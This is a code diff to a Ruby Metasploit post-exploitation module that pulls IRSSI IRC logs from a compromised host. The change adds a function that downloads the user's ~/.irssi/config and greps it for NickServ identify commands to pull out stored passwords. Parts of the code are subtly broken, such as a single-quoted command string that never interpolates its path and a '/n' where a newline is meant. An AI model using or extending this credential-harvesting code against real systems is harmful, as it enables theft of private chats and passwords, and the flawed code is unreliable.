@@ -46,9 +46,9 @@ class Metasploit3 < Msf::Post
         return
       end
       
-      irclogs = get_logs(path)
-      
-        
+      get_logs(path)
+      print_status "Attempting to gather config..."
+      get_config()  
       
       
   end
@@ -62,15 +62,25 @@ class Metasploit3 < Msf::Post
       print_status("#{@peer} - Downloading #{l}")
       content = cmd_exec("cat #{l}")
       name = ::File.basename(l)
-      irc_logs << {:log_name => name, :content => content}
       
-      loot = store_loot('IRSSI_LOOT', 'text/plain', session, content, "#{@peer}_#{l}", "Logs or Configs gathered from IRSSI")
+      loot = store_loot('IRSSI_LOGS', 'text/plain', session, content, "#{@peer}_#{l}", "IRSSI Logs")
       print_good("#{@peer} - #{name} saved as #{loot}")
 			
     end
     return irc_logs
   end
     
+  def get_config()
+    path = "/home/#{user}/.irssi/config"
+    print_status("#{@peer} - Downloading config")
+    content = cmd_exec("cat #{path}")
+    loot = store_loot('IRSSI_CONFIG', 'text/plain', session, content, "#{@peer}_config", "IRSSI Config file")
+    print_good("#{@peer} - Config saved as #{loot}")
+    password = cmd_exec('cat #{path} | grep "autosendcmd = \"/msg nickserv identify"')
+    
+    if password.to_s != ''
+      print_good("#{@peer} - Possible passwords found! /n #{password}")
+    end
 
 	
 
